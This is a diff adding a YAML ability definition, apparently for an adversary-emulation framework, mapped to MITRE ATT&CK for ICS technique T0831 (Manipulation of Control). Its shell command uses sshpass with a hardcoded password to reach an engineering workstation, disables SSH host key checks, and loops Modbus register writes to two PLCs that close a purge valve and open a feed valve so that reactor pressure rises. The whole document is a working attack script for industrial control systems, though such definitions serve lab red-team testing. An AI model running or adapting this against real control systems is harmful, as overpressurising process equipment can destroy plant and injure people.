@@ -1,0 +1,24 @@
+---
+
+- id: a9b8c7d6-1010-1010-1010-000000000004
+  name: SSH Remote Execution - Modbus Pressure Excursion from EWS
+  description: |
+    From EWS over SSH, runs modbus_cli against Purge and Feed 1 to close purge and open feed,
+    causing reactor pressure to rise. Traffic originates from trusted EWS IP (192.168.95.5).
+  tactic: impact
+  technique_id: T0831
+  technique_name: Manipulation of Control
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; } &&
+      sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      engineer@192.168.95.5
+      'for i in $(seq 1 40); do
+      /tmp/modbus_cli 192.168.95.12 --port 502 write_r 1 0;
+      /tmp/modbus_cli 192.168.95.10 --port 502 write_r 1 65535;
+      sleep 0.1;
+      done' &&
+      echo "EWS_REMOTE_WRITE_IMPACT_DONE"
+    timeout: 120
